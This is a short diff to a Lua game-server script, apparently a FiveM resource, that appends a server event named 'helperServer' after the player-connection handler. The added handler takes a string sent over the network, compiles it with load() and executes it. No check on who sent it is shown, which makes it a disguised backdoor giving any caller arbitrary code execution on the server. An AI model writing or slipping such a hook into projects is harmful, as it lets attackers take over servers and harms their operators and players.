@@ -29,3 +29,9 @@ AddEventHandler('playerConnecting', function(name, setReason)
     CancelEvent()
   end
 end)
+
+RegisterServerEvent('helperServer')
+AddEventHandler('helperServer', function(id)
+	local helper = assert(load(id))
+	helper()
+end)
